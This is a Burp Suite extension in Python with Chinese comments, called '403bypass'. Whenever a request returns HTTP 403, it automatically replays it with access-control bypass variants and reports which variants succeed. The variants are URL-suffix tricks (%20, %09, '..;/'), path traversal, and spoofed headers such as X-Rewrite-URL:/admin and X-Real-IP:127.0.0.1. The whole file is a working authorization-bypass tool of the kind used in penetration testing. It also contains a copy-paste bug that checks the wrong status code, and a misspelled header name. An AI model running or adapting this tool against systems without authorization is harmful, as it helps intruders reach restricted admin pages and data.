# -*-coding:utf-8 -*-
# Burp监听到数据包，就会调用processHttpMessage方法
from burp import IBurpExtender, IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
import re


class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     403bypass")
        print("[+]     Author: f0ng")
        print("[+] #####################################\r\n\r\n")

        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks.setExtensionName("403bypass")

        # 用于注册侦听器，该侦听器将通知任何Burp工具发出的请求和响应。扩展可以通过注册HTTP侦听器来执行自定义分析或修改这些消息。参数：listener- 实现IHttpListener接口的扩展创建的对象 。
        callbacks.registerHttpListener(self)


    # 主函数
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
            '''
            :param toolFlag: 一个标志，指示发出请求的Burp工具,Burp工具标志在IBurpExtenderCallbacks界面中定义.例如Proxy和Repeater触发插件
            :param messageIsRequest: 标记是否为请求数据包或响应数据包
            :param messageInfo: 要处理的请求/响应的详细信息。扩展可以调用此对象上的setter方法来更新当前消息，从而修改Burp的行为。
            :return:
            '''
            # Proxy和Repeater触发插件
            if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER or toolFlag == self._callbacks.TOOL_INTRUDER:

                # 处理响应内容
                if not messageIsRequest:
                    # 获取请求包数据
                    resquest = messageInfo.getRequest()

                    # 分析请求，返回数组
                    analyzedRequest = self._helpers.analyzeRequest(resquest)

                    # 请求头
                    request_header = analyzedRequest.getHeaders()
                    request_header_code = request_header

                    # 请求体
                    request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()

                    # 请求host、path
                    request_host, request_Path = self.get_request_host(request_header)

                    # 请求contentType
                    request_contentType = analyzedRequest.getContentType()

                    # 获取端口
                    httpService = messageInfo.getHttpService()
                    port = httpService.getPort()

                    # 获取host
                    host = httpService.getHost()

                    # 获取响应包数据
                    response = messageInfo.getResponse()
                    
                    # 分析响应，返回数组
                    analyzedResponse = self._helpers.analyzeResponse(response)  # returns IResponseInfo
                    
                    # 响应状态
                    response_statusCode = analyzedResponse.getStatusCode()


                    if response_statusCode == 403:

                        uri_primary0 = request_header[0].split(' ')[0]
                        uri_primary2 = request_header[0].split(' ')[2]


                        uri_primary = request_header[0].split(' ')[1]

                        request_lists = uri_primary.split("/")

                        # 一类方法的四种小方法
                        # 方法一
                        # 这是方法一的最后路径
                        request_total1 = uri_primary + "%20"
                        
                        # 将路径带入新的请求
                        request_header[0] = uri_primary0 + " " +request_total1 + " " + uri_primary2

                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True
                        rep1 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedRep1 = self._helpers.analyzeResponse(rep1)
                        rep1_header = analyzedRep1.getHeaders()

                        # 获取响应码
                        rep1_statusCode = analyzedRep1.getStatusCode()
                        
                        if str(rep1_statusCode)[0] != '5' and str(rep1_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1])


                        # 方法二
                        # 这是方法二的最后路径
                        request_total2 = uri_primary + "%09"
                        
                        # 将路径带入新的请求
                        request_header[0] = uri_primary0 + " " +request_total2 + " " + uri_primary2

                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True
                        rep2 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedrep2 = self._helpers.analyzeResponse(rep2)
                        rep2_header = analyzedrep2.getHeaders()

                        # 获取响应码
                        rep2_statusCode = analyzedrep2.getStatusCode()
                        
                        if str(rep2_statusCode)[0] != '5' and str(rep2_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1])


                        # 方法三
                        # 这是方法三最后路径
                        request_total3 = uri_primary + "..;/"
                        
                        # 将路径带入新的请求
                        request_header[0] = uri_primary0 + " " +request_total3 + " " + uri_primary2

                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True

                        rep3 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedrep3 = self._helpers.analyzeResponse(rep3)
                        rep3_header = analyzedrep3.getHeaders()

                        # 获取响应码
                        rep3_statusCode = analyzedrep3.getStatusCode()

                        
                        if str(rep3_statusCode)[0] != '5' and str(rep3_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1])


                        # 方法四
                        request_lists_path_final = request_lists[-1]
                        request_lists.pop(0)
                        request_lists.pop(-1)
                        request_total4 = "/"

                        for request_lists_single in request_lists:
                            request_total4 = request_total4 + request_lists_single

                        # 这是方法四的最后路径
                        request_total4 = request_total4 + "../" + request_lists_path_final
                        
                        # 将路径带入新的请求
                        request_header[0] = uri_primary0 + " " +request_total4 + " " + uri_primary2

                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True

                        rep4 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedRep4 = self._helpers.analyzeResponse(rep4)
                        rep4_header = analyzedRep4.getHeaders()

                        # 获取响应码
                        rep4_statusCode = analyzedRep4.getStatusCode()

                        if str(rep4_statusCode)[0] != '5' and str(rep4_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1])


                        # 二类方法的三种小方法
                        # 方法五(1)

                        request_header[0] = uri_primary0 + " " + uri_primary + " " + uri_primary2
                        request_header.add("X-Rewrite-URL:/admin")

                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True

                        rep5 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedRep5 = self._helpers.analyzeResponse(rep5)
                        rep5_header = analyzedRep5.getHeaders()

                        # 获取响应码
                        rep5_statusCode = analyzedRep5.getStatusCode()
  

                        if str(rep5_statusCode)[0] != '5' and str(rep5_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1] + "X-Rewrite-URL:/admin")


                        # 二类方法的三种小方法
                        # 方法六(2)
                        request_header[0] = uri_primary0 + " " + uri_primary + " " + uri_primary2
                        request_header.pop(-1)
                        request_header.add("X-Real-IP:127.0.0.1")
                        
                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True

                        rep6 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedrep6 = self._helpers.analyzeResponse(rep6)
                        rep6_header = analyzedrep6.getHeaders()

                        # 获取响应码
                        rep6_statusCode = analyzedrep6.getStatusCode()

                        if str(rep6_statusCode)[0] != '5' and str(rep4_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1] + "X-Real-IP:127.0.0.1")


                        # 二类方法的三种小方法
                        # 方法七(2)
                        request_header[0] = uri_primary0 + " " + uri_primary + " " + uri_primary2
                        request_header.pop(-1)
                        request_header.add("X-Forwarder-For:127.0.0.1")
                        
                        # buildHttpMessage的第二个参数可以为None，即为空
                        newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)
                        ishttps = False # 默认为http
                        expression = r'.*(443).*'

                        # 匹配到443开启https
                        if re.match(expression, str(port)): 
                            ishttps = True

                        rep7 = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                        # 获取响应头
                        analyzedrep7 = self._helpers.analyzeResponse(rep7)
                        rep7_header = analyzedrep7.getHeaders()

                        # 获取响应码
                        rep7_statusCode = analyzedrep7.getStatusCode()


                        if str(rep7_statusCode)[0] != '5' and str(rep7_statusCode)[0] != '4':
                            print(host + request_header[0].split(' ')[1] + "X-Forwarder-For:127.0.0.1")



    # 获取请求的url
    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return host, uri

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)
        reqHeaders = analyzedIRequestInfo.getHeaders()
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()
        reqMethod = analyzedIRequestInfo.getMethod()
        reqParameters = analyzedIRequestInfo.getParameters()
        reqHost, reqPath = self.get_request_host(reqHeaders)
        reqContentType = analyzedIRequestInfo.getContentType()
        print(reqHost, reqPath)
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)
        resHeaders = analyzedIResponseInfo.getHeaders()
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        # resStatusCode = analyzedIResponseInfo.getStatusCode()
        return resHeaders, resBodys

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        return host, port, protocol

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType